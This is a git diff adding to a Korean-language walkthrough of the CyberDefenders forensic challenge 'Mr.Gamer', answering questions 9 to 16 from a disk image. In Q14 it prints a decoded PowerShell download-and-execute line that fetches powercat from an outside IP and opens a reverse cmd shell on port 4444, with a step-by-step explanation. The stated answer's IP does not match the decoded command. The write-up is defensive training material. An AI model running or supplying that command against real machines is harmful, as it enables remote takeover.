@@ -1,4 +1,4 @@
-해당 풀이는 cyberdefenders.org의 blueteam-ctf-challenges에서 Mr.Gamer라는 문제를 푸는 과정을 보여주고 있습니다.<br>
+**해당 풀이는 cyberdefenders.org의 blueteam-ctf-challenges에서 Mr.Gamer라는 문제를 푸는 과정을 보여주고 있습니다.<br>**
 https://cyberdefenders.org/blueteam-ctf-challenges/mrgamer/<br><br><br><br>
 
 
@@ -178,18 +178,145 @@ root\home\rafael\Pictures\Screenshot from 2022-02-09 17-42-23.png<br>
 ![1-6](https://github.com/user-attachments/assets/a5acbf6f-cc10-455d-9c4f-8506b790692c)<br>
 따란... 265,345 views - Premiered Dev 11, 2021이라는 것을 확인할 수 있다.<br><br>
 
-따라서 8번 문제의 정답은 **2653452**가 되겠다.<br><br>
+따라서 8번 문제의 정답은 **2653452**가 되겠다.<br><br><br><br>
 
 
 
+**Q9. I'm hungry for videos -> What is the new channel name for the YouTuber whose cookbook is shown on the device?<br><br>**
+
+9번 문제에서는 pc에서 보여진 요리책을 쓴 유튜버의 새로운 채널 이름을 물어보고 있다.<br><br>
+
+![20231117_153635](https://github.com/user-attachments/assets/6b34b0ab-5d03-4d72-9daa-7e4d88415316)<br>
+사진 관련된 파일을 여기저기 찾아다니다보니 \thumbnails 폴더에서 사진과 같이 BINGING WITH BABISH라는 음식이 그려져있는 책 있는 사진을 발견하게 되었다.<br><br>
+
+![1_kFvBt8mharIUP_Ig9oStyQ](https://github.com/user-attachments/assets/a5dc57f0-3fb3-4876-b0a6-8f3dece16594)<br>
+구글에 BINGING WITH BABISH를 검색하니 한 유튜브 채널이 나왔고 그 채널의 이름은 **Babish Culinary Universe**였다.<br><br><br><br>
 
 
 
+**Q10. Hunt the Wumpus ->
+What is the module with the highest installed version for the chat application with the mascot Wumpus?<br><br>**
+
+10번 문제에서는 채팅 어플리케이션의 가장 최신 모듈 버전을 물어보는 문제이다.<br>
+mascot Wumpus을 구글에 검색해보면 Discord 프로그램의 마스코드라고 나오고 있다.<br>
+즉, 문제에서는 디스코드 프로그램의 버전을 물어보는 것이다.<br><br>
+
+root\home\rafael\.config\discord\0.0.16\modules\installed.json<br>
+냅다 디스코드 관련 파일 위치를 찾아냈다. installed.json을 확인해보니<br><br>
+
+![20231117_154122](https://github.com/user-attachments/assets/ee83cfb4-98b3-43c0-9412-020f3bdaf1c2)<br>
+다음과 같은 로그를 볼 수 있었는데, 가장 최신 버전을 보면 5로 되어있는 **discord_voice**가 최신 버전임을 알 수 있었다.<br><br><br><br>
 
 
 
+**Q11. It's raining ocelots and wolves -> According to Windows, what was the temperature in Fahrenheit on February 11th, 2022, at 6:30 PM?<br><br>**
+
+11번 문제는 윈도우에 저장된 2022년 2월 11일, 오후 6시 30분 화씨 온도를 찾는 것이다.<br>
+Thumbnails 파일에 다시 가서 확인해보면<br><br>
+
+![20231117_154801](https://github.com/user-attachments/assets/2df94a9c-e054-45f1-9a33-6ce7c4e288d7)<br>
+오른쪽 아래에 2022년 2월 11일, 오후 6시 30분이라는 것과 왼쪽 아래에 온도가 **45F**로 표시되어 있음을 확인할 수 있다.<br><br><br><br>
 
 
+
+**Q12. Never gonna give... up on this question -> What is the upload date of the second youtube video on the channel from which the user downloaded a youtube video?<br><br>**
+
+12번 문제는 사용자가 유튜브 영상을 다운로드 하였고, 이 영상을 다운 받은 채널의 2번째 영상이 업로드된 날짜를 물어보고 있다.<br><br>
+
+![20231117_155614](https://github.com/user-attachments/assets/a11ba0c9-e9a8-4bc2-a6a0-b5bcab8bce24)<br>
+다운로드 파일 경로인 root\home\rafael\Downloads\을 향해보면 Rick Astley - Never Gonna Give you up 음악 파일이 다운로드 되어 있다.<br><br>
+
+Rick Astley의 유튜브 채널에서 다운로드를 하였으니, 두 번째로 업로드 된 영상의 날짜를 확인해보면 된다.<br>
+![20231117_155759](https://github.com/user-attachments/assets/069b41ba-882a-4fb7-a273-4096e2afc26d)<br>
+**2009년 10월 25일**에 업로드되었다.<br><br><br><br>
+
+
+
+**Q13. Buzzy Bees -> What is the SHA-1 hash of Minecraft's "latest" release according to the system?<br><br>**
+
+마인크래프트의 최신 릴리스 SHA-1 해시값을 물어보는 문제이다.<br>
+.minecraft 디렉토리로 향하며 versions 폴더에 들어가보면 version_manifest_v2.json이라는 파일을 확인할 수 있다.<br><br>
+
+![20231117_160054](https://github.com/user-attachments/assets/80b79426-8d04-46f1-962d-4acb0e2e2ef9)<br>
+해시값은 **3c6e119c0ff307accf31b596f9cd47ffa2ec6305**이다.<br><br><br><br>
+
+
+
+**Q14. he RCE is base(64)d on what? -> What were the three flags and their values that were passed to powercat? The answer must be provided in the same format as the entered command. (For example, if the command was "powercat -D Y -l a -n," the answer would be "-D Y -l a -n")<br><br>**
+
+간단히 말하자면 base64로 인코딩 된 powercat의 명령어를 알아내는 문제이다.<br><br>
+
+문제에서 Powercat을 언급했기에, 히스토리로 다시가서 powercat에 대한 로그들을 확인하다가...<br><br>
+
+Log4jRCE.java 파일을 수정하는 모습을 확인할 수 있었고, marshalsec/poc/ 경로로 파일을 복사한 것을 확인할 수 있었다.<br><br>
+
+경로를 따라가 Log4jRCE.java의 내용을 보게 되면<br>
+![20231117_160520](https://github.com/user-attachments/assets/23a9b12a-9ae7-4028-9adb-b51b2cdc3f16)<br>
+위와 같은 사진을 확인할 수 있었고, 문제에서 base64로 인코딩이 되어있다고 언급했으므로, base64로 디코딩을 다시 해보면,<br><br>
+
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercatps1');
+powercat -c 192.168.191.253 -p 4444 -e cmd"<br><br>
+
+음.... chatpgt 도와줘!<br>
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercatps1'):<br>
+IEX는 PowerShell에서 명령을 즉시 실행하는 기능(Invoke-Expression)이다.<br>
+New-Object System.Net.WebClient는 새로운 웹 클라이언트 객체를 생성하는 명령어다.<br>
+DownloadString('http://192.168.191.253:8000/powercatps1')는 지정된 URL로부터 문자열(스크립트)을 다운로드한다.<br>
+이 부분 전체는 http://192.168.191.253:8000/powercatps1에서 스크립트를 다운로드하고, 그 스크립트를 즉시 실행하라는 의미이다.<br><br>
+
+powercat -c 192.168.191.253 -p 4444 -e cmd:<br>
+powercat는 PowerShell 환경에서 Netcat과 유사한 기능을 제공하는 툴이다.<br>
+-c 192.168.191.253는 클라이언트 모드로 192.168.191.253 IP 주소의 서버에 연결하라는 옵션이다.<br>
+-p 4444는 해당 서버의 4444 포트로 연결하라는 옵션이다.<br>
+-e cmd는 연결이 이루어지면 명령 셸(cmd)을 실행하라는 의미이다.<br>
+종합적으로, 이 명령어는 원격 서버에서 powercatps1 스크립트를 다운로드하고 실행하여, 로컬 컴퓨터를 192.168.191.253의 서버와 연결한 후, 명령 셸을 실행하도록 설정하는 것이다. 이러한 명령은 주로 원격 제어나 해킹, 침투 테스트 등의 목적으로 사용된다.<br><br>
+
+yay~ 문제에서 물어보는 내용은 결국 **-c 192.168.192.253 -p 4444 -e cmd**가 된다.<br><br><br><br>
+
+
+
+**Q15. Hello (New) World -> How many dimensions (including the overworld) did the player travel to in the "oldest of the worlds"?<br><br>**
+
+다시 등장한 마인크래프트 관련된 문제이다. Mr.Gamer라는 문제 답게 게임 관련 질문이 쏟아지고 있는 중이다.<br>
+문제는 가장 오래 전에 생성된 마인크래프트 월드에서 플레이어가 여행을 하는데, 얼마나 많이 dimensions를 탐험했냐고 묻고 있다.<br><br>
+
+우선 .minecraft/saves에는 .이라는 파일, ..이라는 파일, 1_1_8 world라는 파일, New World라는 파일이 존재하는데 가장 오래된 New World 파일을 조사해보면 되겠다.<br><br>
+
+마인크래프트에서는 오버월드/네더/엔드라는 3가지 차원이 존재한다. 즉, 플레이어가 오버월드, 네더, 엔드라는 3가지 차원을 이동한 횟수를 물어보는 문제이다.<br><br>
+
+위 마인크래프트 관련 문제를 풀 때, root\home\rafael\.minecraft\saves\ 경로로 향하였는데<br>
+New World라는 파일을 보면 DIM1, DIM-1 등이 있는데 DIM은 dimension의 줄임말로 보이며 DIM1, DIM-1 디렉토리 안에는 정보들이 들어있지 않다.<br><br>
+
+그 말인 즉슨, 기본으로 플레이어가 스폰하는 월드인 오버월드를 제외하고는 DIM1, DIM-1이라는 차원으로 이동을 하지 않았다는 소리가 된다.<br>
+문제에서는 오버월드를 포함하여 물어보고 있기 때문에 답은 **One**이 된다.<br><br><br><br>
+
+
+
+**Q16. Matrix_1999 is the key! -> What is the mojangClientToken stored in the Keystore?<br><br>**
+
+16번 문제는 mojangClientToken을 찾는 문제다.<br>
+이전 문제들에 비해 난이도가 올라간 문제인데,<br><br>
+
+첫 번째로, keystore을 찾아볼 것이다.<br><br>
+
+sudo find /mnt/Linux -name "*.keystore"<br>
+#returns /mnt/Linux/home/rafael/.local/share/keyrings/user.keystore><br><br>
+
+그 후,  사용자의 keystore을 sudo find /mnt/Linux -name "*.keystore" 명령어를 통해 keyrings 디렉토리에 복사한 뒤 이름을 바꾸었다.<br><br>
+
+cp /mnt/Linux/home/rafael/.local/share/keyrings/user.keystore /home/remnux/.local/share/keyrings/rafael.keystore<br>
+그 후, Passwords and Keys를 가상머신에서 오픈을 해주었꼬, Matrix_1999라는 비밀번호를 통해 잠금해제하였다.<br><br>
+
+![MRGAMER_16_00](https://github.com/user-attachments/assets/d0b683c1-9f32-432e-b425-4b2d326f0f56)<br>
+쭉 아래로 내리다보면 mojangClientToken을 찾을 수 있었다. 그리고 이것을 복사하여 터미널에 값을 얻기 위해 붙여넣었다.<br><br>
+
+![1_oOdf4NeldlO3WER03DKj9Q](https://github.com/user-attachments/assets/c16368e3-49d9-4009-a51b-bcb88eb9b0ed)<br>
+값, **2f76c8b04c004ddd888a05a6cad6be52**을 획득하였다.<br><br><br><br>
+
+
+
+16번 문제를 푸는데 조금 힘들어서 여기저기 서칭을 많이 하고 다녔던 것 같다.
 
 
 
